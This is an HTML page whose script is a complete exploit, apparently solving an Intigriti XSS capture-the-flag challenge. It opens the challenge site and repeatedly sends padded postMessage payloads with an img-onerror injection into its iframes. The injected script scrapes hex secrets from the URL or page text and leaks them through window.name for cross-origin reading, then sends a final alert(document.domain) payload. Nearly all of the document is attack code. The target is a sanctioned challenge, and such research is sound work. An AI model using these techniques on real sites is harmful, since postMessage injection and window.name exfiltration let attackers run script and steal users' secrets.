<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit v2</title>
</head>
<body>
    <h1>Protocol v2: The Name Channel</h1>
    <p>Click Launch. Do not close the new tab.</p>
    <button id="btn" style="font-size:20px; padding:20px; background:blue; color:white;">LAUNCH EXPLOIT</button>
    <h3>Stones Collected:</h3>
    <div id="status">Waiting...</div>
    <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>

    <script>
        let targetWin = null;
        let stones = {}; // Store found secrets
        let attackTimer = null;

        document.getElementById('btn').addEventListener('click', () => {
            // 1. Open the target
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target launched. Engaging...");

            // 2. Start the aggressive attack loop (Run every 200ms)
            // We must race against the 3-second timer.
            attackTimer = setInterval(attackAndCollect, 200);
        });

        function attackAndCollect() {
            if(!targetWin) return;
            
            // We loop through all 6 potential iframes
            for (let i = 0; i < 6; i++) {
                // If we already have this stone, skip attacking it
                if (stones[i]) continue;

                try {
                    // A. ATTACK: Send the exploit to the iframe
                    // We can access the window object targetWin[i] even cross-origin
                    let frame = targetWin[i];
                    if (!frame) continue;

                    // Step 1: Primer (2000 chars padding)
                    frame.postMessage("A".repeat(2000) + "<", '*');

                    // Step 2: Payload
                    // This script runs INSIDE the stone. 
                    // CRITICAL CHANGE: We set 'window.name' instead of using postMessage back.
                    const extractor = `
                        var secret = "";
                        // Method 1: URL Search
                        var match = location.search.match(/=[a-f0-9]{8}/);
                        if(match) secret = match[0].substring(1);
                        
                        // Method 2: Space Stone Listener (It gets code via postMessage)
                        // We attach a listener to catch the parent's message
                        window.addEventListener('message', e => {
                            if(e.data && e.data.length === 8) {
                                window.name = e.data; // Set the name immediately
                            }
                        });

                        // Method 3: DOM Scrape (Fallback)
                        if(!secret) {
                            var body = document.body.innerText;
                            var hex = body.match(/[a-f0-9]{8}/);
                            if(hex) secret = hex[0];
                        }

                        // EXFILTRATE via window.name
                        if(secret) window.name = secret;
                    `;
                    
                    frame.postMessage(`<img src=x onerror="${extractor}">`, '*');

                    // B. COLLECT: Attempt to read the stone's window.name
                    // Cross-origin reading of .name is allowed!
                    let stolenSecret = frame.name;
                    
                    // Check if it looks like a valid secret (8 chars, hex-ish)
                    if (stolenSecret && stolenSecret.length === 8 && !stolenSecret.includes(' ')) {
                        stones[i] = stolenSecret;
                        log(`[+] GOT STONE ${i}: ${stolenSecret}`);
                        updateStatus();
                    }

                } catch(e) { 
                    // Ignore cross-origin errors during loading
                }
            }

            // Check if we won
            if (Object.keys(stones).length >= 6) {
                finishHim();
            }
        }

        function finishHim() {
            clearInterval(attackTimer);
            log("ALL STONES ACQUIRED. ASSEMBLING GAUNTLET...");

            // Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
            // Note: Indices based on your screenshot/code analysis
            const fullCode = 
                (stones[0] || "MISSING") + 
                (stones[5] || "MISSING") + 
                (stones[1] || "MISSING") + 
                (stones[3] || "MISSING") + 
                (stones[2] || "MISSING") + 
                (stones[4] || "MISSING");

            log("CODE: " + fullCode);
            
            // EXECUTE
            // We use the Main Window directly.
            // The listener on the main page is: window.addEventListener('message', ...)
            // It survives the 'bye.jpeg' wipe because it's on the window object.
            const payload = fullCode + "alert(document.domain)";
            targetWin.postMessage(payload, '*');
            
            log("Sent Final Payload. Check the other tab!");
        }

        function updateStatus() {
            document.getElementById('status').innerText = 
                `Stones: ${Object.keys(stones).length} / 6`;
        }

        function log(msg) {
            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
        }
    </script>
</body>
</html>
